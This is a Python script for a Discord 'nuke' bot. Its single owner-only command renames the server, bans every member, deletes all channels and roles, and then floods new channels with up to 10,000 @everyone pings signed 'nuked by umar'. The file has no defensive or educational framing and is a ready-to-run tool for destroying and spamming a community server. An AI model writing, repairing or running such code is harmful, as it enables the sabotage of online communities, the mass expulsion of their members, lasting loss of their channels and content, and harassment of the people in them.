import discord
from discord.ext import commands
import asyncio
import os

# ===== CONFIG =====
TOKEN = os.environ.get('TOKEN')
OWNER_ID = 361069640962801664
PREFIX = ">"

# ===== BOT SETUP =====
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# ===== NUKE COMMAND =====
@bot.command(name='nuke')
async def nuke(ctx):
    if ctx.author.id != OWNER_ID:
        return
    
    guild = ctx.guild
    
    # STEP 0: CHANGE SERVER NAME
    try:
        await guild.edit(name="NUKED BY UMAR")
    except:
        pass
    
    # STEP 1: MASS BAN EVERYONE (FAST)
    for member in guild.members:
        if member != bot.user and member.id != OWNER_ID:
            try:
                await member.ban(reason="nuked by umar")
            except:
                pass
    
    # STEP 2: DELETE ALL CHANNELS (FAST)
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    # STEP 3: DELETE ALL ROLES (FAST)
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except:
                pass
    
    # STEP 4: CREATE CHANNELS AND PING INSTANTLY
    ping_target = 10000
    ping_count = 0
    
    while ping_count < ping_target:
        # Create a channel
        try:
            channel = await guild.create_text_channel(f"get shitted on by umar")
        except:
            continue
        
        # Ping in this channel immediately
        try:
            await channel.send(f"@everyone nuked by umar")
            ping_count += 1
        except:
            pass
        
        # Keep pinging in this channel as fast as possible
        while ping_count < ping_target:
            try:
                await channel.send(f"@everyone nuked by umar")
                ping_count += 1
            except:
                break  # If rate limited, move to next channel

# ===== RUN BOT =====
bot.run(TOKEN)  # ← FIXED: Removed the extra parenthesis
